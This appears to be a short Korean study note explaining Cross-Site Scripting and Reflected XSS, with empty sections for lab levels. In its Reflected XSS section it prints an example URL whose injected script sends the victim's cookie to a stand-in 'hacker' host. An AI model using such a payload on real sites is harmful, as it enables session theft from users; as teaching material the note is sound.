# ⚜️XSS(Cross-Site Scripting)⚜️
### XSS(Cross-Site Scripting) 이란 웹 애플리케이션에서 일어나는 취약점으로 관리자가 아닌 권한이 없는 사용자가 웹 사이트에 스크립트를 삽입하는 공격 기법입니다.

<br>

## Reflected XSS

![R1280x0](https://user-images.githubusercontent.com/86994067/126744443-5ddcf547-29c5-4dcd-a368-4d4e48a0c202.png)

-> Reflected XSS 공격은 사용자에게 입력 받은 값을 서버에서 되돌려 주는 곳에서 발생합니다. 예를 들면 사용자에게 입력 받은 검색어를 그대로 보여주는 곳이나 사용자가 입력한 값을 에러 메세지에 포함하여 보여주는 곳에 악성스크립트가 삽입되면, 서버가 사용자의 입력 값을 포함해 응답해 줄 때 스크립트가 실행됩니다.  보통 Reflected XSS 는 공격자가 악의적인 스크립트와 함께 URL을 사용자에게 누르도록 유도하고, URL을 누른 사용자는 악의적인 스크립트가 실행되면서 공격을 당하게 됩니다.  

예를 들면, GET 방식으로 검색기능을 구현한 웹 애플리케이션에 XSS 취약점이 있음을 확인한 해커는 공격코드를 작성하였습니다. 편의상 URL 인코딩은 하지 않았습니다. 
```http://testweb?search=<script>location.href("http://hacker/cookie.php?value="+document.cookie);</script>```

악의적인 스크립트를 살펴보면 검색 인자로 작성한 스크립트를 넘겨줍니다. 해당 스크립트의 내용은 본인의 웹페이지로 URL을 클릭한 사용자의 쿠키 값이 전송되도록 되어 있습니다. 링크를 클릭한 사용자는 해커한테 본인의 의도와는 상관없이 자신의 쿠키 값을 전송하게 됩니다.


<br>

---

<br>

# Low Level



<br>

# Medium Level



<br>

# High Level







